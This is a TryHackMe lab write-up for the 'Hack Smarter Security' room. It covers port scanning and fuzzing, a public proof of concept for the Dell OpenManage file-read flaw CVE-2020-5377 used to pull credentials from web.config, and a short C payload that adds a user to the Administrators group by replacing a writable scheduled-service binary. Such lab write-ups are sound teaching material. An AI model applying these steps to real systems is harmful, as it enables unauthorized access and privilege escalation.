![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c84d916d-a5e1-439f-ae41-1f40d12cb02b)

https://tryhackme.com/r/room/hacksmartersecurity

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scan:

I began the enumeration by performing a quick Rustscan to identify open ports on the target host. The scan revealed five open ports:

```rust
rustscan -a 10.10.128.73 -- -A -T4 -vv -oN hack_nmap
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2df3a405-0733-4174-9e13-b151d54edf65)

```R
PORT     STATE    SERVICE       REASON          VERSION
21/tcp   open     ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open     ssh           syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQEQMtEIvOihpoAKa9mb4xibUA3epuSK6Rxxs+DoZW3vnh+jS+sRfqlylP7y/n4IzGUuaWlZVKpUq7BpYWy+b6CUQG59eniRhqIbPnQMxgj10aGNB2cwSWJiw7eHL5ifWJpPzhcESEpIo+y7DtWPffqWxU/nVp1gTc9Yq9SrumwiFuzT+CV1MzyMBuqqlhydQ2bmRKY8OPBylO1IfB0vUmttRekXQv5Hzj8+EuY9AyR1Dd/VIPyTAu6azseLp+XRkmbj/SDFCyVFzmcJWrd0U1TRO9JgyqMqpJ1sXaLdLvhN6cF8+TgvQrzIHktXcuuYs0VTxOcGLT6rxgTjvI4SR
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLo3VekZ7ilJh7VVErMMXBCMy6+xLbnG+S3p4AGRj+CYOojmR0hZcEC6m/bk/4wZbI8hqfi7WXkHzb9k229IAwM=
|   256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrfRbBfOafQZpZ/1PAOouyK5o+rG5uKKPllhZk91Q+m
80/tcp   open     http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
|_http-server-header: Microsoft-IIS/10.0
1311/tcp open     ssl/rxmon?    syn-ack ttl 125
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US/localityName=Round Rock/organizationalUnitName=SA Enterprise Software Development
| Issuer: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US/localityName=Round Rock/organizationalUnitName=SA Enterprise Software Development
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-30T19:03:17
| Not valid after:  2025-06-29T19:03:17
| MD5:   4276:b53d:a8ab:fa7c:10c0:1535:ff41:2928
| SHA-1: c44f:51f8:ed54:802f:bb94:d0ea:705d:50f8:fd96:f49f
| -----BEGIN CERTIFICATE-----
| MIIDtjCCAp6gAwIBAgIJAJiVCPPKPIZQMA0GCSqGSIb3DQEBCwUAMIGIMQswCQYD
| VQQGEwJVUzELMAkGA1UECBMCVFgxEzARBgNVBAcTClJvdW5kIFJvY2sxKzApBgNV
| BAsTIlNBIEVudGVycHJpc2UgU29mdHdhcmUgRGV2ZWxvcG1lbnQxETAPBgNVBAoT
| CERlbGwgSW5jMRcwFQYDVQQDEw5oYWNrc21hcnRlcnNlYzAeFw0yMzA2MzAxOTAz
| MTdaFw0yNTA2MjkxOTAzMTdaMIGIMQswCQYDVQQGEwJVUzELMAkGA1UECBMCVFgx
| EzARBgNVBAcTClJvdW5kIFJvY2sxKzApBgNVBAsTIlNBIEVudGVycHJpc2UgU29m
| dHdhcmUgRGV2ZWxvcG1lbnQxETAPBgNVBAoTCERlbGwgSW5jMRcwFQYDVQQDEw5o
| YWNrc21hcnRlcnNlYzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAID1
| 0qf1d/s31Fj8jgv7MtEHjRYX41B+o2p4M5TEIw3kWGrZmfxasZb7KP8lCKcS1+2x
| U08mCd2k0OfnGaeJIqnnzrQlkjhM/EVC+6LXOnC65rpaAmZXeKuH0YzFKSbmSt5k
| 7iTFoYH/QPLKn/lXxlCl4y4x73pCvttLOKtqcoO0a1Rf67kCnHuaRGVfWlidsUYe
| AIWsP8sq/kx+AhOTv4WRK/2Dx51emAguT8167rfiUbu9o6cf0hGhvO9V/d9SLcht
| sF8KVlAYZLHo6Vyzxf412+L2DrxqZoF6v3T8srvj4WMHt8m3lbyxizE68TCmQXzD
| SWoUUhpcv8xQBVCp860CAwEAAaMhMB8wHQYDVR0OBBYEFOADAwMC1j6Zrd4r+sYx
| V7aussbQMA0GCSqGSIb3DQEBCwUAA4IBAQBHVVuwnRybQn2lgUXjQVDWNDhTyV8h
| eKX78tuO/zLOO9H+QvtHnA293NEgsJ1B2hyM+QIfhPxB+uyAh9qkYLwwNWzT5M7i
| JZW2b00Q7JJhyF5ljU6+cQsIc2e9c6ohpka/2YOso18b0McJNZULEf1bkXAgCVFK
| /VUpZqbOUwze/Zyh/UCTY3yLmxmMzkRHIUSCNh7rdi5Rtv/ele0WICTD0eX1Hw0b
| DaUifmqUEI4Lh3SemL5MolJ0FpRrBNznNmWR9xwOFCE1dSaYj8Zo0oaIgJEbkffh
| 9k72dU9PVPMx+kqDak7ntWQHTFuV6GH149dIUPinVmioLAkxPJ2XmoRt
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 09 Jul 2024 07:19:15 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 09 Jul 2024 07:19:22 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
3389/tcp open     ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2024-07-09T07:20:45+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-07-09T07:20:27+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Issuer: commonName=hacksmartersec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-08T07:09:24
| Not valid after:  2025-01-07T07:09:24
| MD5:   96ef:e6b7:dc6f:b4fd:5567:8515:2d32:46aa
| SHA-1: 8e4c:408c:88e1:3a62:4dbd:c20a:3036:c43f:be07:9512
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQQVcmsaHga4RKzVDGBhdnADANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5oYWNrc21hcnRlcnNlYzAeFw0yNDA3MDgwNzA5MjRaFw0yNTAx
| MDcwNzA5MjRaMBkxFzAVBgNVBAMTDmhhY2tzbWFydGVyc2VjMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA35vU5New/voi23ltmB4WcQj0Ik6nrtz1ApIU
| I9kZDM1ldJm8fCaP2mO9tkqcwHwxWPOZBRSQ/JBRpYhvq2levAtIQmmyqCj8+YP8
| C0wGJqNbV3WNI6lyK/ms8nddjqP2v/HTlvbh3/vhFsWS4VFDrMxl2w4Fp5X2I96/
| ZmO+nrPB79NOpEMqmsUGV9DCTP4y1DkdJitIKumClQyZe4uSO69f/rK825cp406y
| o3hypNZLLGPXoM9zwJimpHwcK8LCizyTEdSM6hwi64r2lG/G3R0dpR2ye8cbGJ8n
| LX+bsX69jNwVeVV+YzexHo6xCA0wGvJupoC+QcDRahM8iCgp5QIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAH1IINbhfe3jKHsm3oPPCHZCl+5Sum7rUsx7YYgXPP89vJN5eW1qrSV7sxzx
| 1FL/ZP2W4bIQN7Pi7NI6/SU7uKKL42i3eFWwIEG3FR+2QT+J4LZSE5xoJJjUknIX
| Oux6xgMqUC2imFkShytO/br4jspmWAnIp4Uggxm1ksLfJ3bMwSjZ3jjrN8kgc/Wy
| SZyl/i1dopo4I6wo5lxW+rYBZRnQ93rJGsuLh7Y9zFtJgm1yxuMbr3fPjfOLKQ9E
| TVx4TA4998G2NGFlpcS4Ll5OyXorrkNL4kkWhv7GPqJOfK2QW0pdK4dHkfpyCgbR
| FaQysSV4Pipr6YFFXAh+21NtSP8=
|_-----END CERTIFICATE-----
7680/tcp filtered pando-pub     no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.94SVN%T=SSL%I=7%D=7/9%Time=668CE473%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securit
SF:y:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20a
SF:ccept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20
SF:Tue,\x2009\x20Jul\x202024\x2007:19:15\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20S
SF:trict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\"
SF:>\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20conten
SF:t=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\
SF:r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/
SF:loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\
SF:x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20languag
SF:e=\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"
SF:/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20ty
SF:pe=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"jav
SF:ascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTTP
SF:Options,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max
SF:-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-enc
SF:oding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Tue,\x200
SF:9\x20Jul\x202024\x2007:19:22\x20GMT\r\nConnection:\x20close\r\n\r\n<!DO
SF:CTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN
SF:\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<htm
SF:l>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text/
SF:html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link\
SF:x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmast
SF:er\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=\
SF:"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"javas
SF:cript\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/g
SF:navbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"text
SF:/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\"
SF:></script><script\x20language=\"javascript\">\r\n\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (85%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/9%OT=21%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=668CE4D0%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=2%ISR=103%TS=U)
SEQ(SP=106%GCD=1%ISR=107%TS=U)
OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   259.85 ms 10.6.0.1
2   ... 3
4   327.32 ms 10.10.128.73
```

### Web enumeration:

Since there were two ports running web applications—ports 80 and 1311—I performed fuzzing on both.

- Port 80: Hosts a website for "Hackers for Hire."
- Port 1311: Runs the "Dell EMC OpenManage" application.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/08deebb5-5f63-4bca-91d7-5dfa31a58767)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4c4df25a-0f32-49ab-a0b3-bf8d1f72c488)

#### Port 80 Fuzzing:

I used dirsearch to fuzz port 80 but didn’t find much in the results:

```sh
dirsearch -u http://10.10.46.205/ -x 404,403 --crawl
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4f2fcbe9-6443-4913-9228-abe346d742a1)

#### Port 1311 Fuzzing:

Next, I performed fuzzing on port 1311 using ffuf and discovered a few interesting directories:

```sh
ffuf -u https://10.10.109.134:1311/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/42db4d32-a585-499b-a9b5-6221a7e14ec0)

Upon examining these directories, I found that authentication is required to access them. 😕

### FTP:

Next, I explored the FTP service as port 21 was open and anonymous login was allowed. Upon accessing the FTP directory, I found two files:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e3654a96-8c08-4d9e-a6e4-97e9ea9e5aef)

#### File Analysis:
- stolen_cards.txt:

I examined the stolen_cards.txt file but did not find any credentials or sensitive information.

- passport.png:

I also checked the passport.png image for any hidden data or metadata containing credentials but found it to be clean.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/afecec8c-5565-417c-860d-0a0df12922ef)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

I revisited the Dell OpenManage application and found its version listed in the "About" section as **9.4.0.2**:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b418b7b5-6e09-49c6-ae98-4c5f8c8c69a7)

Searching for exploits related to this version, I came across a [RhinoSecurity blog post](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/) that described a file read vulnerability (CVE-2020-5377). The blog also provided a link to a [Proof of Concept (PoC) on GitHub](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514), which I cloned to my Kali host.

Upon executing the script with the correct arguments, a prompt appeared to enter the filename to read. I started with the common Windows file "C:\windows\win.ini":

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9aca0834-9fc0-4d48-a48c-2a170df1848e)

This confirmed the exploit's effectiveness by displaying the contents of win.ini. Knowing that port 80 was open and a web server was running on a Windows-based OS, I deduced the presence of the "inetpub" directory, commonly used for web server files.

Through trial and error, I discovered a web config file at:

```
C:\inetpub\wwwroot\hacksmartersec\web.config
```

Reading this file revealed credentials:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0d31ffe2-58d6-4cdf-921b-46d8f34b96d5)

Using these credentials, I successfully logged into the system, obtaining initial access:🙂

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5d28a3fc-810d-4d14-80a3-c2dc01823dca)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After logging in, I began manual enumeration by checking user privileges but did not find any special privileges that would help with privilege escalation.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bfab13eb-d985-410c-81d5-1b50c8fd9d54)

Manual enumeration didn’t reveal much information, so to save time, I decided to use [WinPeas](https://github.com/peass-ng/PEASS-ng/releases/download/20240707-68b6f322/winPEASany_ofs.exe). Unfortunately, it was blocked by the antivirus software. 😕

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/7a510355-4832-4292-b722-e2b2b23e7111)

As an alternative, I used [PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1), which was not blocked by the antivirus.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/156160d0-d314-4176-a6e6-f8067491a9a2)

PrivescCheck results revealed a task named "**spoofer-scheduler**" located at "C:\Program Files (x86)\Spoofer".

![image](https://github.com/user-attachments/assets/8bf6c1b8-8623-47af-b12d-ac4f377e8eef)

Checking the permissions on this folder, I found that I could make changes in the folder and had permissions to start and stop the associated service.

![image](https://github.com/user-attachments/assets/4a6857dd-f6c5-4fc5-adf9-eea5fbf81196)

Leveraging this, I wrote a C code snippet to add the user "tyler" to the Administrators group:

```c
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}
```

I compiled this code into an executable, stopped the spoofer-scheduler service, replaced it with my malicious executable, and restarted the service.

![image](https://github.com/user-attachments/assets/b7ba06b4-85fb-4161-8cb4-9e9e0be1511c)

After starting the service, I verified that "tyler" now had administrator privileges. 🎉

![image](https://github.com/user-attachments/assets/0fedd1ec-069f-4171-ae80-1dd1838c22fc)

I logged out and logged in again via SSH to confirm the additional privileges. 🎉

![image](https://github.com/user-attachments/assets/f7ea5392-bf37-4dc0-aff2-5b333484c1cb)

With sufficient privileges, I accessed the Administrator's folder and obtained the final piece of information to solve the lab.
